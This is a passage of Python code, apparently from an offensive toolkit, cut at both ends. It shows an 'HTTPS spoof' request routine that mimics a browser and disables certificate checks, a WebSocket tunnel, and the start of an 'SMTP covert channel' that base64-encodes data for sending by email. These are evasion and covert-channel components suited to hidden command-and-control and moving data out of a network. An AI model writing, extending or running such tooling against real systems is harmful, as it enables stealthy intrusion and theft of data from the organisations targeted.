                'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none', 'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }
            resp = requests.get(url, headers=headers, timeout=15, verify=False)
            return f"[HTTPS SPOOF] Status: {resp.status_code} | Server: {resp.headers.get('Server','N/A')} | Length: {len(resp.content)}\n{resp.text[:500]}"
        except Exception as e:
            return f"[ERROR] HTTPS spoof failed: {e}"


def _websocket_tunnel(self, action: str, url: str = None, data: str = None) -> str:
        """WebSocket隧道"""
        try:
            if action == "connect":
                if not url:
                    return "[ERROR] url required"
                try:
                    import websocket
                    self._ws_conn = websocket.create_connection(url, timeout=10)
                    return f"[WS] Connected to {url}"
                except ImportError:
                    return "[ERROR] pip install websocket-client"
            elif action == "send":
                if not hasattr(self, '_ws_conn') or not self._ws_conn:
                    return "[ERROR] No connection. Use 'connect' first."
                self._ws_conn.send(data)
                return f"[WS] Sent {len(data)} bytes"
            elif action == "recv":
                if not hasattr(self, '_ws_conn') or not self._ws_conn:
                    return "[ERROR] No connection"
                self._ws_conn.settimeout(5)
                return f"[WS] Received: {self._ws_conn.recv()[:2000]}"
            elif action == "close":
                if hasattr(self, '_ws_conn') and self._ws_conn:
                    self._ws_conn.close()
                    self._ws_conn = None
                    return "[WS] Closed"
                return "[WS] No active connection"
            else:
                return f"[ERROR] Unknown action: {action}"
        except Exception as e:
            return f"[ERROR] WebSocket failed: {e}"


def _smtp_covert(self, action: str, smtp_server: str, imap_server: str = None,
                     email: str = None, password: str = None, data: str = None) -> str:
        """SMTP隐蔽通道"""
        try:
            import smtplib
            if action == "send":
                if not data:
                    return "[ERROR] data required"
                encoded = base64.b64encode(data.encode()).decode()
